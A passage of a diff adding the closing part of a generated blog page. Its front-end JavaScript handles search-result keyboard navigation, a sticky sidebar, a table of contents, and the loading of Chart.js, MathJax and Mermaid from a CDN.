+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
